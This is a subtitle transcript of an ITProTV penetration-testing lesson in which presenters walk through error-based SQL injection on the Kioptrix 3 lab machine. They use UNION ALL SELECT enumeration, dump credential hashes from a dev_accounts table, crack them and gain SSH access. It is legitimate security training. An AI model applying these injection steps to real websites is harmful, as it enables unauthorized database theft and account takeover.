00:17:53.760\nThere is no path,\nno stone you wanna leave unturned.\n\n325\n00:17:53.760 --> 00:17:54.980\nYou follow everything.\n\n326\n00:17:54.980 --> 00:18:00.380\nAnd it did take me quite a while to\nfind an area, cuz I'm looking for\n\n327\n00:18:00.380 --> 00:18:06.080\nSQL injection, and\nall the stuff seem to be SQL problems.\n\n328\n00:18:06.080 --> 00:18:10.130\nThere were other things that caught my\neye, but I'm looking specifically for SQL.\n\n329\n00:18:10.130 --> 00:18:11.065\n&gt;&gt; [LAUGH]\n&gt;&gt; I'm like,\n\n330\n00:18:11.065 --> 00:18:14.390\nthis thing does not seem to\nhave any real SQL difficulties,\n\n331\n00:18:14.390 --> 00:18:16.595\nat least not from manual enumeration.\n\n332\n00:18:16.595 --> 00:18:17.865\nI could have done something else,\n\n333\n00:18:17.865 --> 00:18:20.575\nrun a vulnerability scanner against it,\nmaybe that would find it for me.\n\n334\n00:18:20.575 --> 00:18:24.245\nBut I'm trying to do it\nthe old fashioned way, right?\n\n335\n00:18:24.245 --> 00:18:24.825\nThe hard way.\n\n336\n00:18:24.825 --> 00:18:29.983\nSo I'm moving around through here, and\nwe get this cut to the chase, see it now.\n\n337\n00:18:29.983 --> 00:18:31.985\nThey're talking about their\nnew revamped website.\n\n338\n00:18:31.985 --> 00:18:34.827\nI click on that, and it takes me\nto do this really cool website,\n\n339\n00:18:34.827 --> 00:18:36.500\nif that's what you wanna call them.\n\n340\n00:18:36.500 --> 00:18:39.510\nGive us a little more,\nI guess this is as low as that goes.\n\n341\n00:18:39.510 --> 00:18:40.620\nWe got these goats,\n\n342\n00:18:40.620 --> 00:18:44.080\nthis handsome young devil right\nhere all decked out to the nines.\n\n343\n00:18:45.400 --> 00:18:46.580\nPictures all over the place.\n\n344\n00:18:47.740 --> 00:18:53.220\nSee over here, our URL is on the gallery,\nso I'm just gonna click on a picture.\n\n345\n00:18:53.220 --> 00:18:54.400\nOf course, I get this guy here.\n\n346\n00:18:56.350 --> 00:18:57.580\nLet's see here, why [INAUDIBLE].\n\n347\n00:18:57.580 --> 00:19:03.610\nI see why, because the web link\nitself is a little messed up.\n\n348\n00:19:03.610 --> 00:19:05.460\nSo I can look at,\nthere we go, show you guys.\n\n349\n00:19:06.460 --> 00:19:08.950\nNotice I'm hovering over the picture and\nit's saying keyoptics3.com.\n\n350\n00:19:08.950 --> 00:19:11.820\nYou know what I'm gonna do to fix that?\n\n351\n00:19:11.820 --> 00:19:15.370\nI'm gonna edit that file,\nthat etsy host file.\n\n352\n00:19:15.370 --> 00:19:21.120\nReally quickly, nano,\ncuz it wants kioptrix3, not kioptrix-3.\n\n353\n00:19:21.120 --> 00:19:22.362\nForgive me, kind sir.\n\n354\n00:19:22.362 --> 00:19:22.880\n&gt;&gt; [LAUGH]\n&gt;&gt; /etc.\n\n355\n00:19:22.880 --> 00:19:28.170\nI was just trying to stay consistent\nwith my naming conventions here, but\n\n356\n00:19:28.170 --> 00:19:29.440\nthey will have none of it.\n\n357\n00:19:29.440 --> 00:19:30.950\nGo in here, change that.\n\n358\n00:19:32.850 --> 00:19:37.380\nThere we go, and then Ctrl+O,\nCtrl+X to save that.\n\n359\n00:19:37.380 --> 00:19:39.780\nNow let's try going to that.\n\n360\n00:19:39.780 --> 00:19:41.420\nThere we go,\nnow things are working correctly.\n\n361\n00:19:42.600 --> 00:19:47.140\nSo I was clicking through here and\nI'm looking at, I tried this ratings area.\n\n362\n00:19:47.140 --> 00:19:48.280\nI thought, maybe that ratings,\n\n363\n00:19:48.280 --> 00:19:52.290\ncuz it's got some cool stuff\nin the URL down here below.\n\n364\n00:19:52.290 --> 00:19:55.310\nIf you guys can see that,\nshowing you all the URL stuff.\n\n365\n00:19:55.310 --> 00:19:59.300\nThis is what was kinda catching my eye,\nthis vote.phpid=3.\n\n366\n00:19:59.300 --> 00:20:01.570\nSomething like that,\n\n367\n00:20:01.570 --> 00:20:04.430\nthat's definitely what you wanna look for,\nthings of that nature.\n\n368\n00:20:05.580 --> 00:20:09.600\nSo I'm gonna click back in, and\nwe'll zoom back out really quickly.\n\n369\n00:20:09.600 --> 00:20:11.910\nWhere was it that I went?\n\n370\n00:20:11.910 --> 00:20:12.800\nI think I, let me go back.\n\n371\n00:20:14.140 --> 00:20:16.640\nI got into one area, this gallery area.\n\n372\n00:20:16.640 --> 00:20:17.760\nHere we go.\n\n373\n00:20:17.760 --> 00:20:22.070\nI was looking through here and\nI noticed the sorting options right here.\n\n374\n00:20:22.070 --> 00:20:25.444\nClicked on that, and\nI just clicked on Photo ID.\n\n375\n00:20:25.444 --> 00:20:29.781\nAnd then when I did that,\nI noticed up here,\n\n376\n00:20:29.781 --> 00:20:34.530\nI got PHP id equals one and sort photo id.\n\n377\n00:20:34.530 --> 00:20:35.630\nThat was what caught my eye,\n\n378\n00:20:35.630 --> 00:20:40.850\nthat was what,\nthat photo id equals something, right?\n\n379\n00:20:40.850 --> 00:20:45.170\nI thought good spot,\nmaybe a SQL injection could be an issue.\n\n380\n00:20:45.170 --> 00:20:46.660\nJust a test, right?\n\n381\n00:20:46.660 --> 00:20:48.360\nThere's no input box here, right?\n\n382\n00:20:48.360 --> 00:20:52.078\nBut there is something going\non there with that id=1.\n\n383\n00:20:52.078 --> 00:20:54.500\nSo I'm just gonna erase that out.\n\n384\n00:20:54.500 --> 00:20:57.560\nAnd I'm just gonna add a semicolon, right?\n\n385\n00:20:57.560 --> 00:21:00.770\nBecause remember,\nsemicolons are used in transact-SQL.\n\n386\n00:21:00.770 --> 00:21:01.666\nSo let's see.\n\n387\n00:21:01.666 --> 00:21:04.240\nI just hit Return, and I get an error.\n\n388\n00:21:04.240 --> 00:21:07.099\nI was like [SOUND] finally,\nI found a good spot!\n\n389\n00:21:07.099 --> 00:21:11.709\nYou have an error in your SQL syntax, so\nwe're getting errors from the machine.\n\n390\n00:21:13.280 --> 00:21:15.060\nCorresponds to your SQL server, and\n\n391\n00:21:15.060 --> 00:21:18.020\nit tells you where the error\nis in here and all that.\n\n392\n00:21:18.020 --> 00:21:18.700\nThat's good for me.\n\n393\n00:21:18.700 --> 00:21:23.770\nNow I know,\nlet's try hitting it with some actual SQL.\n\n394\n00:21:23.770 --> 00:21:25.290\nSo I'm gonna take that out.\n\n395\n00:21:26.570 --> 00:21:29.580\nNow I'm gonna try using an order.\n\n396\n00:21:29.580 --> 00:21:32.210\nNow, if I didn't get an error,\nthat doesn't mean I'm out of the game.\n\n397\n00:21:32.210 --> 00:21:35.090\nIt just means I gotta try\na different technique, right?\n\n398\n00:21:35.090 --> 00:21:37.950\nAnd then, if that technique doesn't work,\nthen I'm out of the game, right?\n\n399\n00:21:37.950 --> 00:21:41.720\nThen SQL injection's not gonna\nbe my platform of attack.\n\n400\n00:21:41.720 --> 00:21:44.550\nWe would try blind SQL injection,\nwhich we're gonna get to.\n\n401\n00:21:44.550 --> 00:21:48.670\nSo if that didn't work, I will show you\nhow to continue testing, all right?\n\n402\n00:21:48.670 --> 00:21:50.750\nBut for here, we do, we get errors.\n\n403\n00:21:50.750 --> 00:21:53.790\nSo I can get responses\nfrom the SQL Server.\n\n404\n00:21:53.790 --> 00:21:59.672\nI'm gonna try order by, and\nthen I'll just say 1--, like that.\n\n405\n00:21:59.672 --> 00:22:03.310\nThat dash is basically like\neverything after this is a comment.\n\n406\n00:22:04.390 --> 00:22:06.570\nSo hit Return, and\nyou guys know SQL, right?\n\n407\n00:22:06.570 --> 00:22:07.160\nYou guys are SQLs.\n\n408\n00:22:08.320 --> 00:22:11.060\nYou'll notice that I got no errors.\n\n409\n00:22:12.290 --> 00:22:14.830\nThat means what, Mike?\n\n410\n00:22:14.830 --> 00:22:16.820\n&gt;&gt; That means they liked it, it worked.\n\n411\n00:22:16.820 --> 00:22:18.208\n&gt;&gt; That's right, exactly.\n\n412\n00:22:18.208 --> 00:22:21.380\nIf it doesn't get an error, that means\nmy SQL statement went through and\n\n413\n00:22:21.380 --> 00:22:23.380\nit was fine with it,\nit didn't have a problem.\n\n414\n00:22:23.380 --> 00:22:26.130\n&gt;&gt; And I think you did what you did\nthe dash dash, right, on that one?\n\n415\n00:22:26.130 --> 00:22:26.970\n&gt;&gt; Yeah.\n&gt;&gt; Yeah, which is,\n\n416\n00:22:26.970 --> 00:22:30.470\nif you guys know your SQL, as Daniel was\nsaying, comments out everything else.\n\n417\n00:22:30.470 --> 00:22:34.630\nSo you're just saying, hey, here,\nrun this, and then ignore anything else\n\n418\n00:22:34.630 --> 00:22:36.900\nthe website might be adding,\njust ignore it completely.\n\n419\n00:22:36.900 --> 00:22:37.840\n&gt;&gt; That's right.\n\n420\n00:22:37.840 --> 00:22:40.910\nSo, now that we know that we can do that,\nwhat I wanna do is I wanna find out\n\n421\n00:22:40.910 --> 00:22:45.520\nwhere's a good spot for me to actually\nreach into the SQL database and\n\n422\n00:22:45.520 --> 00:22:48.210\npull data out of there so\nthat I can see them?\n\n423\n00:22:48.210 --> 00:22:53.660\nI wanna know where are these tables and\ncolumns occurring in the website?\n\n424\n00:22:53.660 --> 00:22:58.530\nSo we can continue to use our SQL\ninjection to figure those things out.\n\n425\n00:22:58.530 --> 00:23:01.180\nNow, what we'll do is\nwe'll do that by using our\n\n426\n00:23:02.250 --> 00:23:04.340\nUNION ALL SELECT statement, right?\n\n427\n00:23:04.340 --> 00:23:06.740\nSo, UNION ALL, and then SELECT.\n\n428\n00:23:06.740 --> 00:23:10.100\nNow, we do have to find out exactly\nhow many columns there are.\n\n429\n00:23:10.100 --> 00:23:13.740\nWe can't have the wrong amount, we have\nto use the exact amount of columns there.\n\n430\n00:23:13.740 --> 00:23:15.320\nSo we have to do a little bit of testing.\n\n431\n00:23:15.320 --> 00:23:17.640\nLet me show you how to do that.\n\n432\n00:23:17.640 --> 00:23:18.480\nGo back into my URL here.\n\n433\n00:23:18.480 --> 00:23:23.510\nTake my order by out and\ndo union all select.\n\n434\n00:23:24.640 --> 00:23:27.400\nLike that.\nAnd then say one.\n\n435\n00:23:27.400 --> 00:23:27.900\nHit return.\n\n436\n00:23:29.180 --> 00:23:32.590\nHere, I get the you select statement\nhave different number of columns and\n\n437\n00:23:32.590 --> 00:23:33.860\ncould not select the category.\n\n438\n00:23:33.860 --> 00:23:38.190\nSo, the error is actually telling me I\ndidn't use the right number of columns.\n\n439\n00:23:38.190 --> 00:23:39.480\nI need to continue, okay?\n\n440\n00:23:39.480 --> 00:23:42.060\nI'm gonna continue doing that, too.\n\n441\n00:23:42.060 --> 00:23:44.920\nSo I just comma two, no spaces.\n\n442\n00:23:44.920 --> 00:23:45.460\nTry that.\n\n443\n00:23:45.460 --> 00:23:47.693\nStill getting an error.\n\n444\n00:23:47.693 --> 00:23:53.040\nBecause I've done this,\nI will got to 6 and hit Return.\n\n445\n00:23:53.040 --> 00:23:54.661\nNow you see that things are working.\n\n446\n00:23:54.661 --> 00:24:00.348\nI know that there's 6 because when\nI go to 7 I get an error, right?\n\n447\n00:24:00.348 --> 00:24:03.050\nSo if I'm getting an error,\nit's the wrong amount of columns.\n\n448\n00:24:03.050 --> 00:24:05.610\nWhen I hit the right amount of columns,\nI get the website.\n\n449\n00:24:05.610 --> 00:24:12.010\nNot only do I get the website but\nif I go to 6, right 6, there it is.\n\n450\n00:24:12.010 --> 00:24:15.030\nYou'll notice that, instead of\nthe information that was there before,\n\n451\n00:24:15.030 --> 00:24:18.350\nwe get this 2 and 3, right here.\n\n452\n00:24:18.350 --> 00:24:21.340\nI know this says 3, but that's\nan actual number of photos over here.\n\n453\n00:24:21.340 --> 00:24:25.139\nWhat this is doing is it is showing me\nwhere column 2 and column 3 actually are.\n\n454\n00:24:25.139 --> 00:24:28.040\nIt's displaying that information.\n\n455\n00:24:28.040 --> 00:24:31.300\nSo now I know where I can output my info.\n\n456\n00:24:31.300 --> 00:24:32.730\nVery, very cool stuff, right?\n\n457\n00:24:32.730 --> 00:24:34.810\nSo, what can I do with that?\n\n458\n00:24:34.810 --> 00:24:39.190\nBasically, I say in column 2,\nI add some more SQL, right?\n\n459\n00:24:39.190 --> 00:24:40.534\nI can add some more SQL in column 3.\n\n460\n00:24:40.534 --> 00:24:44.850\nSo let's take a look at\nwhat that looks like.\n\n461\n00:24:44.850 --> 00:24:47.071\nLet me make sure I follow my notes here.\n\n462\n00:24:47.071 --> 00:24:48.993\nHate when the notes cut off on a page.\n\n463\n00:24:48.993 --> 00:24:49.980\nIt's always fun.\n\n464\n00:24:51.340 --> 00:24:52.690\nSo we've gotten through that.\n\n465\n00:24:52.690 --> 00:24:54.590\nWhat are we gonna do next?\n\n466\n00:24:54.590 --> 00:24:56.260\nLet's try the version.\n\n467\n00:24:56.260 --> 00:24:58.160\nWhat version of SQL are we using?\n\n468\n00:24:58.160 --> 00:25:05.140\nSo I can go into my URL and say,\nin column 2, just erase the 2, @@version.\n\n469\n00:25:05.140 --> 00:25:06.660\nLike that.\n\n470\n00:25:06.660 --> 00:25:13.158\nHit Enter, and\nyou'll notice it says 5.0.51a-3Ubuntu5.4.\n\n471\n00:25:13.158 --> 00:25:13.875\nSo pretty cool.\n\n472\n00:25:13.875 --> 00:25:18.588\nI could have put that version in 3, and\nit would have gone in the 3 column.\n\n473\n00:25:18.588 --> 00:25:20.725\nSo, starting to get enumeration, right?\n\n474\n00:25:20.725 --> 00:25:23.319\nWe're still really enumerating the box.\n\n475\n00:25:24.380 --> 00:25:26.100\nLet's see here.\n\n476\n00:25:26.100 --> 00:25:27.020\nMoving on down the pipe.\n\n477\n00:25:29.220 --> 00:25:31.650\nLet's see who we're running as.\n\n478\n00:25:31.650 --> 00:25:32.569\nWho's the user?\n\n479\n00:25:32.569 --> 00:25:34.470\nLet's try that.\n\n480\n00:25:35.730 --> 00:25:37.581\nUser, I think it's like that, is it?\n\n481\n00:25:37.581 --> 00:25:38.098\nIs that correct?\n\n482\n00:25:38.098 --> 00:25:38.982\nYeah, there we go.\n\n483\n00:25:38.982 --> 00:25:39.718\nRoot at local.\n\n484\n00:25:39.718 --> 00:25:40.568\nWell, so that's interesting.\n\n485\n00:25:40.568 --> 00:25:44.247\nIt's always a nice thing to know, so\nI'm issuing these statements as root.\n\n486\n00:25:44.247 --> 00:25:46.339\nAt least that's what it says I'm doing.\n\n487\n00:25:47.600 --> 00:25:48.530\nThat's a good sign.\n\n488\n00:25:49.690 --> 00:25:50.810\nNow we need the table enumerate.\n\n489\n00:25:50.810 --> 00:25:56.180\nWe need to find out what tables\nare available to us in this database.\n\n490\n00:25:56.180 --> 00:26:01.103\nSo what I can do, is I can come in\nhere and I can say, what is it?\n\n491\n00:26:01.103 --> 00:26:02.345\nIt is table name, right?\n\n492\n00:26:02.345 --> 00:26:06.260\nTable_name, like so and\n\n493\n00:26:06.260 --> 00:26:12.590\nthen go to the end of that column\nenumeration area and just say from.\n\n494\n00:26:14.260 --> 00:26:17.841\nYeah, from information,\n\n495\n00:26:17.841 --> 00:26:23.452\nI cannot spell mation_schema.tables.\n\n496\n00:26:23.452 --> 00:26:26.300\nLike that, you start looking through here.\n\n497\n00:26:26.300 --> 00:26:29.970\nYou start to see it's giving\nme every one of the tables\n\n498\n00:26:29.970 --> 00:26:32.780\nthat is available in that database.\n\n499\n00:26:32.780 --> 00:26:34.770\nSo we've got columns that's a good one.\n\n500\n00:26:34.770 --> 00:26:36.230\nI definitely want to enumerate that.\n\n501\n00:26:38.370 --> 00:26:41.480\nAll these different things going on here.\n\n502\n00:26:41.480 --> 00:26:47.930\nProfiling, a lot of tables,\nmore tables, table privileges.\n\n503\n00:26:47.930 --> 00:26:50.910\nSo I think that, there's a user table,\nthat's interesting.\n\n504\n00:26:52.080 --> 00:26:53.210\nThis one's actually really tricky.\n\n505\n00:26:53.210 --> 00:26:54.850\nThe person that set this up was devious.\n\n506\n00:26:54.850 --> 00:26:56.517\n&gt;&gt; [LAUGH]\n&gt;&gt; Because they got me, and\n\n507\n00:26:56.517 --> 00:26:57.310\nthey got me good.\n\n508\n00:26:57.310 --> 00:26:59.470\nAnd I'll show you where\nin just a second here.\n\n509\n00:26:59.470 --> 00:27:00.550\nLet's crank forward.\n\n510\n00:27:00.550 --> 00:27:02.990\nNow that we know that table's up,\nlet's do columns.\n\n511\n00:27:02.990 --> 00:27:04.070\nSee the column names.\n\n512\n00:27:06.200 --> 00:27:07.703\nColumns, Daniel.\n\n513\n00:27:07.703 --> 00:27:10.988\nColumn name dot columns.\n\n514\n00:27:15.112 --> 00:27:16.302\nLike so.\n\n515\n00:27:16.302 --> 00:27:21.184\nAnd actually, yeah, and\nI'll say what table because I'll show\n\n516\n00:27:21.184 --> 00:27:25.378\nyou something really funny here,\nlet's just do that.\n\n517\n00:27:25.378 --> 00:27:30.300\nHere's the columns, and\nas I was going through here,\n\n518\n00:27:30.300 --> 00:27:33.836\nI got down to the bottom, where was it?\n\n519\n00:27:33.836 --> 00:27:34.733\nWas it in this one or in tables?\n\n520\n00:27:34.733 --> 00:27:36.940\nThis is a lot of data.\n\n521\n00:27:39.160 --> 00:27:43.220\nBut as I got to the bottom,\nthere were, was it user?\n\n522\n00:27:43.220 --> 00:27:44.590\nYeah, so I had user.\n\n523\n00:27:44.590 --> 00:27:45.608\nI thought that's for user.\n\n524\n00:27:45.608 --> 00:27:49.840\nAnd then there was another one that was,\nI think password.\n\n525\n00:27:49.840 --> 00:27:50.820\n&gt;&gt; Pass maybe?\n\n526\n00:27:50.820 --> 00:27:52.352\n&gt;&gt; Right, let me see, I'm almost there.\n\n527\n00:27:52.352 --> 00:27:53.948\nOoh, I thought I passed it a little bit.\n\n528\n00:27:53.948 --> 00:27:58.823\nOffset, PACKED, PAGE, PAGE, PARAMETER,\n\n529\n00:27:58.823 --> 00:28:02.450\nso it must have been in the tables.\n\n530\n00:28:03.450 --> 00:28:04.220\nSo, there it is.\n\n531\n00:28:04.220 --> 00:28:06.457\nPassword, so I saw user and\npasswords and I thought great,\n\n532\n00:28:06.457 --> 00:28:08.120\nthat's the ones I wanna enumerate.\n\n533\n00:28:08.120 --> 00:28:08.909\nAnd man, did they get me.\n\n534\n00:28:08.909 --> 00:28:09.467\n&gt;&gt; Yeah.\n\n535\n00:28:09.467 --> 00:28:11.830\n&gt;&gt; Cuz nothing was coming out.\n\n536\n00:28:11.830 --> 00:28:15.275\nThere was no data coming in it because\nthere's no stinking data in them.\n\n537\n00:28:15.275 --> 00:28:19.531\n&gt;&gt; [LAUGH]\n&gt;&gt; There's another one called dev\n\n538\n00:28:19.531 --> 00:28:22.685\naccounts up here some ways.\n\n539\n00:28:22.685 --> 00:28:24.700\nThere's a lot of stuff in here.\n\n540\n00:28:24.700 --> 00:28:27.438\nAnyway, there's one called dev accounts,\ntrust me, it's there.\n\n541\n00:28:27.438 --> 00:28:32.010\nAnd then when I went back through it I\nsaid, well what's this dev accounts one?\n\n542\n00:28:32.010 --> 00:28:33.660\nAnd lo and behold,\nwe found some information.\n\n543\n00:28:33.660 --> 00:28:36.330\nSo let me show you that, how to do that.\n\n544\n00:28:36.330 --> 00:28:40.400\nIf I come in here,\nI wanna read that column info.\n\n545\n00:28:40.400 --> 00:28:43.880\nSo it is username and password.\n\n546\n00:28:45.397 --> 00:28:47.860\nSo those exist, so\nI'm gonna use column 2 for username.\n\n547\n00:28:47.860 --> 00:28:53.083\nUsername, and\nthen I'm gonna take 3 out and\n\n548\n00:28:53.083 --> 00:29:00.236\ncall it password cuz those were\ngood columns and good tables.\n\n549\n00:29:00.236 --> 00:29:04.491\nAnd I will say from the table\n\n550\n00:29:04.491 --> 00:29:09.118\ndev_accounts, like that.\n\n551\n00:29:09.118 --> 00:29:12.815\nAnd then once I did that,\nwe now see I've got a username,\n\n552\n00:29:12.815 --> 00:29:17.330\nI've got an encrypted password,\nthat's a hashed password.\n\n553\n00:29:17.330 --> 00:29:20.880\nBut there's two usernames and\npasswords that came out in those fields.\n\n554\n00:29:20.880 --> 00:29:25.048\nI can now copy and paste those, which is\nexactly what I did, if I come here and\n\n555\n00:29:25.048 --> 00:29:25.578\ndo an ls.\n\n556\n00:29:25.578 --> 00:29:30.165\nI got this creds.txt cat creds and\nI just copied them and\n\n557\n00:29:30.165 --> 00:29:35.350\nI shoved them through my password\ncracker and it was md5 hash.\n\n558\n00:29:36.350 --> 00:29:39.800\nThere's online md5 decreptors and\nwe were off to the races.\n\n559\n00:29:40.900 --> 00:29:42.170\nAnd I got those passwords.\n\n560\n00:29:42.170 --> 00:29:48.432\nFrom there, if I do a little endmap,\n\n561\n00:29:48.432 --> 00:29:53.079\nmap of kioptrics3.com,\n\n562\n00:29:53.079 --> 00:29:56.720\nI see the ssh is open.\n\n563\n00:29:58.460 --> 00:30:00.989\nAnd I can try to login with ssh or\n\n564\n00:30:00.989 --> 00:30:06.550\nwe will use that because it uses\nStar Wars, and I like that.\n\n565\n00:30:06.550 --> 00:30:08.498\n&gt;&gt; I knew you would.\n\n566\n00:30:08.498 --> 00:30:14.544\n&gt;&gt; I cannot spell, at kioptrics3.com.\n\n567\n00:30:14.544 --> 00:30:19.694\nThere is his password which is Star Wars\nwhich is all typed on one hand,\n\n568\n00:30:19.694 --> 00:30:20.853\noddly enough.\n\n569\n00:30:20.853 --> 00:30:23.040\n&gt;&gt; [LAUGH]\n&gt;&gt; You don't use your right hand at all.\n\n570\n00:30:23.040 --> 00:30:23.930\nAnd I'm logged in.\n\n571\n00:30:23.930 --> 00:30:30.100\nAnd now I'm set up for a springboard into,\nwe looked at privilege escalation.\n\n572\n00:30:30.100 --> 00:30:31.110\nNot a root user.\n\n573\n00:30:31.110 --> 00:30:32.450\nI didn't try to pseudo anything,\n\n574\n00:30:32.450 --> 00:30:37.920\nbut I assume you'll have\nto in some way from here.\n\n575\n00:30:37.920 --> 00:30:41.810\nTo continue on to root,\nbut I was able to log in.\n\n576\n00:30:41.810 --> 00:30:43.620\nI've got Shell access.\n\n577\n00:30:43.620 --> 00:30:47.460\nI can continue my exploitation from\nthere all using what we learned\n\n578\n00:30:47.460 --> 00:30:49.560\nfrom enumeration through SQL.\n\n579\n00:30:49.560 --> 00:30:51.410\n&gt;&gt; Yeah, that is amazing stuff, Dan.\n\n580\n00:30:51.410 --> 00:30:54.004\nAnd we appreciate those\ngreat demonstrations,\n\n581\n00:30:54.004 --> 00:30:58.560\nreally shows you that with a little bit of\nknowledge of your Transact-SQL language,\n\n582\n00:30:58.560 --> 00:31:02.863\nas a pentester, you can take advantage of\nthe fact that they're not scrubbing or\n\n583\n00:31:02.863 --> 00:31:04.213\nvalidating that input.\n\n584\n00:31:04.213 --> 00:31:08.190\nAllowing those commands to be processed\nby the SQL server in the back end.\n\n585\n00:31:08.190 --> 00:31:12.893\nAnd that's never gonna be a good thing\nwhen you can let random public people fire\n\n586\n00:31:12.893 --> 00:31:16.020\nSQL [LAUGH] commands\nagainst your SQL server.\n\n587\n00:31:16.020 --> 00:31:19.214\nWhen I say SQL, understand I'm not saying\nSQL as in the Microsoft product, right?\n\n588\n00:31:19.214 --> 00:31:23.402\nWe're talking about Transact-SQL\nas a language and SQL,\n\n589\n00:31:23.402 --> 00:31:25.750\nStructure Query Language.\n\n590\n00:31:25.750 --> 00:31:30.011\nAnd just SQL database engines,\nof which Microsoft SQL is one, but\n\n591\n00:31:30.011 --> 00:31:34.653\nthere's also MySQL, and there's\nseveral other free and open source,\n\n592\n00:31:34.653 --> 00:31:39.319\nthat all use that same common language,\nthat Transact-SQL or T-SQL.\n\n593\n00:31:39.319 --> 00:31:44.008\nSo learning that is a big part of being a\ngood pentester, especially if you're gonna\n\n594\n00:31:44.008 --> 00:31:47.520\nwork with command line or\ncommand injection or SQL injection.\n\n595\n00:31:47.520 --> 00:31:51.010\nSo, Daniel, I know we got some\nmore SQL injection to do.\n\n596\n00:31:51.010 --> 00:31:53.994\nBut unfortunately, we are out of time for\nthis particular episode.\n\n597\n00:31:53.994 --> 00:31:55.730\nSo we're gonna have to call it there.\n\n598\n00:31:55.730 --> 00:31:59.910\nWe're gonna leave you hanging and\nwhen we come back with our next part,\n\n599\n00:31:59.910 --> 00:32:03.450\nwe'll finish up or at least\ncontinue on with our SQL injection.\n\n600\n00:32:03.450 --> 00:32:04.320\nSo thank you for that, Daniel.\n\n601\n00:32:04.320 --> 00:32:04.890\n&gt;&gt; No problem.\n\n602\n00:32:04.890 --> 00:32:06.530\n&gt;&gt; Hope everybody out\nthere enjoyed watching.\n\n603\n00:32:06.530 --> 00:32:09.500\nSigning off for ITProTV,\nI've been your host, Mike Rodrick.\n\n604\n00:32:09.500 --> 00:32:10.400\n&gt;&gt; I'm Daniel Lowrie.\n\n605\n00:32:10.400 --> 00:32:12.754\n&gt;&gt; And we'll see you next time.\n\n606\n00:32:12.754 --> 00:32:19.070\n[MUSIC]\n\n607\n00:32:19.070 -->

You're watching ITPRO.TV.\n\n4\n00:00:12.630 --> 00:00:15.780\n&gt;&gt; Hello welcome to another\nexciting episode here at ITPRO.TV.\n\n5\n00:00:15.780 --> 00:00:20.250\nI'm your host, Mike Rodrick and\ntoday we're doing penetration testing and\n\n6\n00:00:20.250 --> 00:00:24.000\nin this episode, we're gonna be\ncontinuing our look at SQL injection,\n\n7\n00:00:24.000 --> 00:00:25.800\ncuz we've got a little bit more to do.\n\n8\n00:00:25.800 --> 00:00:31.470\nSo here to guide us along through\nour SQL injection exploration is Mr.\n\n9\n00:00:31.470 --> 00:00:32.050\nDaniel Lowrie.\n\n10\n00:00:32.050 --> 00:00:32.780\nWelcome back, Daniel.\n\n11\n00:00:32.780 --> 00:00:33.780\n&gt;&gt; I'm so glad to be back.\n\n12\n00:00:33.780 --> 00:00:37.190\nYeah, we kinda had a little bit more to\ntalk about when it comes to SQL injection.\n\n13\n00:00:37.190 --> 00:00:39.060\nEven though we showed you\nsome really cool stuff.\n\n14\n00:00:39.060 --> 00:00:41.200\nOr at least I hope you think\nit was really cool stuff.\n\n15\n00:00:41.200 --> 00:00:42.170\n&gt;&gt; I did.\n\n16\n00:00:42.170 --> 00:00:44.510\n&gt;&gt; Being able to grab usernames and\n\n17\n00:00:44.510 --> 00:00:49.850\npasswords out of a database that's\n&gt;&gt; Being fronted by a web front end,\n\n18\n00:00:49.850 --> 00:00:51.730\nthat could be interesting.\n\n19\n00:00:51.730 --> 00:00:54.570\n&gt;&gt; And the scary thing is\nmost organizations nowadays,\n\n20\n00:00:54.570 --> 00:00:59.650\njust about every website that you go to,\nis dynamic, it can load up content.\n\n21\n00:00:59.650 --> 00:01:04.370\nAnd they've got some kind of database back\nin, and in those databases they're storing\n\n22\n00:01:04.370 --> 00:01:07.560\nall kinds of information that\nthe website needs to build, right?\n\n23\n00:01:07.560 --> 00:01:12.970\nProduct information, prices,\n&gt;&gt; Customer names, email addresses,\n\n24\n00:01:12.970 --> 00:01:16.500\ncredit card information of they've\nchosen to say that with the website so.\n\n25\n00:01:16.500 --> 00:01:18.210\nThere's a lot of juicy information and\n\n26\n00:01:18.210 --> 00:01:20.320\nthere so either if you can't\ntake over the machines.\n\n27\n00:01:20.320 --> 00:01:22.220\nJust the SQL injection\nbeing able to get access\n\n28\n00:01:22.220 --> 00:01:23.390\n&gt;&gt; To that data.\n\n29\n00:01:23.390 --> 00:01:24.180\nIs dangerous enough.\n\n30\n00:01:24.180 --> 00:01:25.180\n&gt;&gt; Yeah, that's exactly right.\n\n31\n00:01:25.180 --> 00:01:29.920\nSo you gotta make sure to sanitize\nyour table, sanitize your input,\n\n32\n00:01:29.920 --> 00:01:35.200\nmake sure that what gets actually run by\nSQL is what's supposed to be run by SQL.\n\n33\n00:01:35.200 --> 00:01:38.610\nThat's the whole purpose of us testing\nthese things and trying to find them.\n\n34\n00:01:38.610 --> 00:01:42.106\nAnd, remember, like we always like to say,\ndon't try this at home, kids.\n\n35\n00:01:42.106 --> 00:01:44.050\n&gt;&gt; [LAUGH]\n&gt;&gt; Well, actually try it at home,\n\n36\n00:01:44.050 --> 00:01:48.720\njust not against machines that you don't\neither have full authorized access to, or\n\n37\n00:01:48.720 --> 00:01:51.010\nthat you own personally.\n\n38\n00:01:51.010 --> 00:01:53.930\nSo that being said,\nlet's jump back into SQL.\n\n39\n00:01:53.930 --> 00:01:54.800\nWhere do we leave off?\n\n40\n00:01:54.800 --> 00:01:58.080\nWell, in the previous episode,\nwe looked at error-based enumeration.\n\n41\n00:01:58.080 --> 00:02:03.560\nWe were getting errors that let us\nrealize that we could inject SQL and\n\n42\n00:02:03.560 --> 00:02:09.760\nthen we injected SQL into the URL to try\nto enumerate more data out of the site,\n\n43\n00:02:09.760 --> 00:02:11.210\nout of the database, which we did.\n\n44\n00:02:11.210 --> 00:02:14.860\nWe got a couple of users and their\npasswords even though they're encrypted.\n\n45\n00:02:14.860 --> 00:02:18.660\nYou just run it through a decrypter and\nbada bing there's your passwords.\n\n46\n00:02:18.660 --> 00:02:19.160\nNo big deal.\n\n47\n00:02:20.360 --> 00:02:23.600\nBut what happens if the site\ndoes not give you any errors?\n\n48\n00:02:24.660 --> 00:02:30.390\nYou type in a string in the URL, or\nyou put something into an input box,\n\n49\n00:02:30.390 --> 00:02:33.510\nand it just comes back,\nor just nothing happens.\n\n50\n00:02:33.510 --> 00:02:36.260\n&gt;&gt; Well, at that point, I give up,\nI throw in the towel and I walk away.\n\n51\n00:02:36.260 --> 00:02:37.690\n&gt;&gt; That's right,\nsecurity through obscurity.\n\n52\n00:02:37.690 --> 00:02:40.480\nIt's so stinking hard,\nthis must be not worth my time.\n\n53\n00:02:40.480 --> 00:02:43.880\nNo, it doesn't mean you're done, just\nmeans you got to try a different door,\n\n54\n00:02:43.880 --> 00:02:45.480\nright, we just gotta try a different door.\n\n55\n00:02:45.480 --> 00:02:47.910\nAnd that's where blind SQL\ninjection comes into 